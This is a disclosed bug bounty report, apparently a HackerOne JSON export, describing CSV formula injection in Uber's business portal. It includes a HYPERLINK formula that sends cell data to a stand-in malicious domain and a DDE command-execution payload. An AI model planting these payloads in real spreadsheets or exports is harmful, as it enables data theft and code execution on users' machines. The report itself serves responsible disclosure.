{
  "id": 126109,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjYxMDk=",
  "url": "https://hackerone.com/reports/126109",
  "title": "CSV Injection in business.uber.com",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-03-26T02:59:24.520Z",
  "submitted_at": "2016-03-26T02:59:24.520Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ddworken",
    "url": "/ddworken",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-04-06T21:27:51.334Z",
  "bug_reporter_agreed_on_going_public_at": "2016-03-30T19:11:28.880Z",
  "team_member_agreed_on_going_public_at": "2016-04-06T21:27:50.723Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "business.uber.com allows for names to begin with an ```=``` which allows for injection of formulas into the downloaded CSVs. I wasn't quite sure what to categorize this as since there are two main problems with allowing injection of formulas into a CSV: \n\n1. It allows for data exfiltration through HYPERLINKs\n2. It allows for code execution on the user's machine provided that they trust Uber\n\n1 can be done by setting one's username to something of the form:  ```\"=HYPERLINK(\"https://maliciousDomain.com/evil.html?data=\"&A1, \"Click to view additional information\")\"```. This will create a cell that will show the text \"Click to view additional information\" but when clicked will send the data in A1 to ```maliciousDomain.com```. \n\n2 can be done by setting one's username to something of the form: ```=cmd|' /C calc'!A0``` (this will open Windows calculator). If a CSV contains a command like the above, excel will warn the user with two different pop up boxes. The problem is that these boxes ask the user whether they \"trust the source of\" the file. Since most users will trust Uber as a source, they will click through this without worry. \n\nWhile it is true that one needs to be an admin on the business page in order to change the username, this still qualifies as a vulnerability (and not simply a self-CSV-injection) since there can be multiple admins. This allows for one admin to get code execution on another admin's computer through the download CSV function. \n\nOne final note, the function to download a CSV of all trips is also likely vulnerable to this but I have not tested it since I have not had a chance to take an Uber on my business account. \n\nThanks,\nDavid Dworken",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-04-29T19:11:29.432Z",
  "allow_singular_disclosure_after": -245868759.14973366,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "savitar0x01",
    "silv3rpoision",
    "kero_magdy",
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 1785,
      "category": "researcher",
      "content": "business.uber.com allows administrators to download CSVs containing a list of the users associated with their business. It is possible to inject formulas into the CSVs by starting names with `=`. ",
      "user": {
        "id": 17344,
        "username": "ddworken",
        "name": "David Dworken",
        "bio": "Security Engineer -- keybase.io/dworken",
        "cleared": false,
        "verified": false,
        "website": "https://daviddworken.com",
        "location": "Seattle, WA",
        "created_at": "2015-02-09T18:16:44.568Z",
        "url": "https://hackerone.com/ddworken",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
